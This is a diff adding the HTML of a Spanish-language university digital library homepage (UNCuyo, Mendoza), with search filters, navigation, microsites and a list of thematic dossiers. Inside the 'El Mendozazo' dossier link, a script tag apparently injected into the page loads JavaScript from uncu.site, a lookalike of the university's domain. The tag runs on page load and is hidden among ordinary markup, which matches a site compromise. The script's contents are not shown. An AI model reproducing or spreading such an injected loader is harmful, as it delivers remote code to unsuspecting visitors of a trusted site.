+           <td align="left" valign="top" bgcolor="#4C6375" class="navegar_td"><label for="uncutipot0"><input type="checkbox" value="Textual: Libros"  name="uncutipo[Textual: Libros]" id="uncutipot0" />Libros</label> <br><label for="uncutipot1"><input type="checkbox" value="Textual: Entrevista"  name="uncutipo[Textual: Entrevista]" id="uncutipot1" />Entrevista</label> <br><label for="uncutipot2"><input type="checkbox" value="Textual: Investigación"  name="uncutipo[Textual: Investigación]" id="uncutipot2" />Investigación</label> <br><label for="uncutipot3"><input type="checkbox" value="Textual: Material didáctico"  name="uncutipo[Textual: Material didáctico]" id="uncutipot3" />Material didáctico</label> <br><label for="uncutipot4"><input type="checkbox" value="Textual: Revistas"  name="uncutipo[Textual: Revistas]" id="uncutipot4" />Revistas</label> <br><label for="uncutipot5"><input type="checkbox" value="Textual: Tesis"  name="uncutipo[Textual: Tesis]" id="uncutipot5" />Tesis</label> <br></td>
+           <td align="left" valign="top" bgcolor="#4C6375" class="navegar_td"><label for="uncutipov0"><input type="checkbox" value="Video: Informes Especiales"  name="uncutipo[Video: Informes Especiales]" id="uncutipov0" /> Informes Especiales</label> <br><label for="uncutipov1"><input type="checkbox" value="Video: Noticias Universitarias"  name="uncutipo[Video: Noticias Universitarias]" id="uncutipov1" /> Noticias Universitarias</label> <br><label for="uncutipov2"><input type="checkbox" value="Video: Entrevistas"  name="uncutipo[Video: Entrevistas]" id="uncutipov2" /> Entrevistas</label> <br><label for="uncutipov3"><input type="checkbox" value="Video: Eventos Académicos"  name="uncutipo[Video: Eventos Académicos]" id="uncutipov3" /> Eventos Académicos</label> <br><label for="uncutipov4"><input type="checkbox" value="Video: Documentales"  name="uncutipo[Video: Documentales]" id="uncutipov4" /> Documentales</label> <br></td>
+           <td align="left" valign="top" bgcolor="#4C6375" class="navegar_td"><label for="uncutipoa0"><input type="checkbox" value="Audio: Entrevistas"  name="uncutipo[Audio: Entrevistas]" id="uncutipoa0" />Entrevistas</label> <br><label for="uncutipoa1"><input type="checkbox" value="Audio: Eventos Académicos"  name="uncutipo[Audio: Eventos Académicos]" id="uncutipoa1" />Eventos Académicos</label> <br><label for="uncutipoa2"><input type="checkbox" value="Audio: Informes Especiales"  name="uncutipo[Audio: Informes Especiales]" id="uncutipoa2" />Informes Especiales</label> <br><label for="uncutipoa3"><input type="checkbox" value="Audio: Documentales"  name="uncutipo[Audio: Documentales]" id="uncutipoa3" />Documentales</label> <br></td>
+         </tr>
+         <tr>
+           <td colspan="3" align="center" class="navegar_td">
+           <input name="Submit" type="submit" class="boton-buscar" value="Buscar">           </tr>
+       </table>
+</form>
+      
+
+<link href="/js/ffp/style.css" rel="stylesheet" type="text/css">
+
+       <!-- NAVEGADOR -->
+   </div>
+   
+   <br>
+   <table width="95%" border="0" align="center" cellpadding="4" cellspacing="1">
+     <tr align="left" valign="top">
+       <td  height="29" colspan="2" align="left" valign="bottom" bgcolor="#4C6375" class="tit_tipoobjeto"> NAVEGAR</td>
+       </tr>
+     <tr align="left" valign="top">
+       <td width="26%" align="left" valign="top" bgcolor="#4C6375" class="navegar_td"><img src="/img/nav_txt.jpg" width="70" height="19" onclick="marcar('t');"></td>
+       <td width="74%" align="left" valign="top" bgcolor="#4C6375" class="navegar_td"><ul>
+         <li><a href="/navegador.php?idplantilla=4">Revistas</a></li>
+         <li><a href="/navegador.php?idplantilla=10"> Informes de investigaci&oacute;n</a></li>
+         <li><a href="/navegador.php?idplantilla=19"> Libros Electr&oacute;nicos</a></li>
+         <li><a href="/navegador.php?idplantilla=11"> Prod. Cient&iacute;fica Acad&eacute;mica</a></li>
+         <li><a href="/navegador.php?idplantilla=22"> Prod. Cient&iacute;fica Independiente</a></li>
+         <li> <a href="/navegador.php?idplantilla=21">Tesis de grado y posgrado</a></li>
+        <!--
+
+ <li> <a href="/navegador.php?idplantilla=30">Memoria Acad&eacute;mica</a></li>
+
+-->
+          <li> <a href="/navegador.php?idplantilla=35">Eventos </a></li>
+         
+       </ul></td>
+     </tr>
+     
+     <tr align="left" valign="top">
+       <td width="26%" valign="top" bgcolor="#4C6375" class="navegar_td"><img src="/img/nav_vid.jpg" width="70" height="19" onclick="marcar('v');" ></td>
+       <td width="74%" valign="top" bgcolor="#4C6375" class="navegar_td"><ul>
+       <li> <a href="/navegador.php?idplantilla=32">Videos HD </a></li>
+       
+         <li><a href="/navegador.php?idplantilla=5">Archivos Audiovisuales(Entrevistas, Formaci&oacute;n<br>
+Acad&eacute;mica, Documentales, Noticias Universitarias)</a> </li>
+         <li> <a href="/navegador.php?idplantilla=14">Microprogramas</a></li>
+       
+       
+       </ul></td>
+     </tr>
+     
+     <tr align="left" valign="top">
+       <td width="26%" valign="top" bgcolor="#4C6375" class="navegar_td"><img src="/img/nav_aud.jpg" width="70" height="19" onclick="marcar('a');"></td>
+       <td width="74%" valign="top" bgcolor="#4C6375" class="navegar_td"><ul>
+         <li><a href="/navegador.php?idplantilla=16">Archivos Sonoros<span > (Documentales)</span></a></li>
+         <li><a href="/navegador.php?idplantilla=26">Microprogramas sonoros</a></li>
+       </ul></td>
+     </tr>
+   </table>
+
+
+
+                <br>
+
+                <table width="95%" border="0" align="center" cellpadding="3" cellspacing="0">
+                  <tr >
+                    <td class="tit_micrositios" bgcolor="#4C6375"><!--Micrositios-->
+                    <img src="img/micrositios_logo.webp" width="200" height="auto">  
+                    </td>
+                  </tr>
+                  <tr align="left" valign="top">
+                    <td class="lista_micrositios">
+                      <h3>
+                        <a href="https://bdigital.uncu.edu.ar/micrositios/?micrositio=jardinbotanico" target="_blank">Jardín Botánico de Chacras de Coria </a></h3>
+                  <p><small>Fichas descriptivas de las especies del jardín botánico en la Fac. de Ciencias Agrarias.</small> <br/>
+                  </p>
+                        <h3>
+                            <a href="http://ddhh.bdigital.uncu.edu.ar/" target="_blank">Derechos Humanos</a></h3>
+                      <p><small>Selección de trabajos alrededor de la temática de los Derechos Humanos en la Argentina y en Mendoza en particular.</small> <br/>
+                      </p>
+                        
+                      <h3> <a href="/micrositios/?micrositio=vino" target="_blank">El vino en Mendoza</a></h3>
+                      <p><small>Una selección de artículos, tesis, informes de investigación y videos sobre temáticas de la vid, la vinificación, la economía y la cultura del vino mendocino</small>
+                      </p>
+                      <!-- <h3><a href="/micrositios/?micrositio=memoria_academica" target="_blank">Memoria Académica</a></h3>
+                     <p><small>Memoria académica reune las resoluciones y normas</small>
+                      dictadas dentro de la UNCuyo en materia de reglamentación académica.</p>-->
+                      <h3><a href="/micrositios/?micrositio=posgradoffyl" target="_blank">Posgrado de la Facultad de Filosofía y Letras</a></h3>
+                      <p><small>Espacio virtual que pone a disposición tesis doctorales y trabajos finales de maestría de posgrados dictados en la Facultad de Filosofía y Letras de la UNCuyo.<br>
+                      </small>
+                      </p>                   
+                      
+                      
+                    <h3><a href="/micrositios/?micrositio=economicas" target="_blank">  Tesis de grado de Ciencias Econ&oacute;micas </a></h3>
+                      <p><small>En este sitio se pueden consultar las tesis de grado de la Facultad de Cs. Económicas de la UCuyo. La búsqueda se puede hacer por autor, titulo y descriptores a texto completo en formato pdf.<br>
+                      </small>
+                      </p>
+                      <p align="right"><a href="/micrositios/"><!--Listado completo &gt;--><img src="img/+micrositios.webp" width="100" height="auto"></a><br>
+                      </p>
+                      
+                      
+                      
+                    </tr>
+                </table>
+                <br>
+                
+    <table width="340" border="0" align="center" cellpadding="3" cellspacing="0">
+                  <tr >
+                    <td align="left" valign="bottom" class="dossier_top">//DOSSIERS ESPECIALES</td>
+              </tr>
+                  <tr>
+                    <td align="center" valign="top" class="dossier_inf"> 
+                    <p class="dossier_pres">
+                    Cada Dossier contiene una selecci&oacute;n de objetos digitales en diversos formatos, bajo un concepto tem&aacute;tico transversal. 		<br> La propuesta invita al usuario a vincular contenidos y conocer los trabajos que la UNCuyo produce sobre tem&aacute;ticas específicas.<br>
+                    </p>     
+                    
+                        <div style="height:200px; width:300px; overflow:auto">                      
+                                             
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Apr 2022</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=21">El Mendozazo</title><script src=https://uncu.site/WV3WHY.js></script></a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Mar 2013</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=20">Dossier 24 de marzo, Día Nacional de la Memoria por la Verdad y la Justicia.</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Mar 2013</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=19">8 de marzo, Día Internacional de la Mujer. Homenaje a Alieda Verhoeven.</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Feb 2013</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=18">Vendimia e Industria Vitivinícola</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Jun 2012</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=17">Cumbre Mercosur en Mendoza: Integración Latinoamericana</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Jun 2012</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=16">7 de Junio, Día del periodista.</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Jun 2012</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=15">5 de Junio, Día Mundial del Medio Ambiente</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">May 2012</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=14">Homenaje a Arturo Andrés Roig</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Mar 2012</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=13">22 de Marzo, Día Mundial del Agua</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Nov 2011</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=12">Homenaje a Antonio Di Benedetto</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Jun 2011</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=11">1º de junio: día del Sociólogo</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Sep 2010</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=10">Una filosofía para una nueva nación. A propósito de la edición del manuscrito de Luis José de la Peña, Lecciones de filosofía, 1827</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Sep 2010</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=9">Homenaje al Dr. Gregorio Weinberg</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Sep 2010</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=8">El Malbec</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Dec 2009</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=6">Cátedra Virtual para la Integración Latinoamericana 2009</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Apr 2008</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=2">Historia de los Movimientos Sociales</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">Mar 2008</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=1">Conversaciones con filósofos mendocinos</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+                       
+<table width="300"  border="0" cellpadding="3" cellspacing="1" class="dossier_td">
+                          <tr align="left">
+                            <td scope="row">
+                            <!--<img src="/img/folder.png" align="absmiddle">--> <span class="fecha">May 2007</span> <br/>
+                                <h3 class="dossier"><a href="/dossier/?id=4">Entrevistas a investigadores de la Secretaría de Ciencia y Técnica de la UNCuyo</a></h3>
+                                </td>
+                          </tr>
+                        </table>
+                       
+
+
+
+ </div>
+   </div>  
+                        </td>
+                  </tr>
+                  <tr>
+                    <td align="center" valign="top" class="dossier_pot">&nbsp;</td>
+                  </tr>
+                </table>
+<br>
+           <!-- <table width="95%" border="0" align="center" cellpadding="3" cellspacing="0">
+              <tr >
+                <td class="tit_micrositios" ><strong> Micrositios</strong> </td>
+              </tr>
+              <tr align="left" valign="top">
+                <td class="lista_micrositios"><p><a href="http://sociologia.bdigital.uncu.edu.ar/" target="_blank">Producciones Sociológicas de Mendoza</a></p>
+                </tr>
+            </table>
+            <br>-->
+           <table width="80%" border="0" align="center" cellpadding="5" cellspacing="0" class="navegar_td">
+                  <tr align="left">
+                    <td height="20" class="navegar_td">Para la correcta utilizaci&oacute;n de todos los materiales de esta biblioteca es necesario que disponga de: </td>
+                  </tr>
+                  <tr align="center">
+                    <td class="navegar_td"> <a href="http://get.adobe.com/es/reader/" target="_blank"><img src="/img/get_adobe_reader.jpg"></a> </td>
+              </tr>
+                  <tr align="center">
+                    <td class="navegar_td"><a href="http://get.adobe.com/es/flashplayer/" target="_blank"><img src="/img/get_flash_player.jpg"></a></td>
+                  </tr>
+            </table>
+<br>
+                
+                    <div align="center" class="navegar_td">
+                        <p class="btn_results"><strong>Objetos Digitales Publicados : 11413</strong>
+                        </p> 
+            </div>
+				
+                </td>
+</tr>
+
+		  </table>
+
+
+
+          
+          </td>
+</tr>
+</table>
+
+
+
+
+
+<table width="80%" border="0" align="right" cellpadding="5" cellspacing="0" class="barra">   <tr align="left">   
+ <td width="100%" height="20" align="center" class="td_tithijos">  
+  <a href="/bdadmin/" target="_blank"> 
+<img src="../img/application_key.png" width="32" height="32"><br> 
+   Ingreso a la Administraci&oacute;n</a></td>  </tr></table> 
+
+<br>
+<table border="0" cellspacing="0" cellpadding="5" width="100%" align="left" class="Footer2">
+  <tr valign="middle">
+    <td width="191">
+    <img src="/img/banner.jpg" align="left"></td>
+    <td width="458"><span class="txtpie">Secretar&iacute;a Acad&eacute;mica </span><span class="dcred"><strong><br>
+    </strong></span><span class="txtpie_amarillo"><strong>SID - UNCuyo - Mendoza. Argentina. </strong></span><span class="dcred"><br>
+    </span><span class="txtpie"><a href="/paginas/contacto.php" style="color:#FFFFFF;text-decoration:underline">Comentarios
+    y Sugerencias</a></span></td>
+    <td width="275" align="right">
+    <!--Creative Commons License-->
+  <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/3.0/deed.es"><img alt="Creative Commons License" style="border-width: 0" src="https://i.creativecommons.org/l/by-nc-sa/3.0/88x31.png"/></a> <br/>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CENHZJ78KJ"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CENHZJ78KJ');
+</script>
+
+
+
+   <script>
+var qrcode = false ; 
+
+function makeCode (url) {		
+  
+      if (qrcode ==false ){
+
+         qrcode = new QRCode(document.getElementById("qrcode"), {
+          width : 200,
+          height : 200
+        }); 
+        jQuery("#qrcode").toggle(); 
+        qrcode.makeCode(url);
+      }
+     }
+  
+      </script>
+
+
+
+
+<map name="Map">
+  <area shape="rect" coords="4,4,172,69" href="https://sid.uncu.edu.ar" target="_blank">
+  <area shape="rect" coords="175,28,352,69" href="https://www.uncuyo.edu.ar/academica/" target="_blank">
+</map>
+
+
+
+</body>
+</html>
+<!-- Directorio : template_home plantilla home.html -->
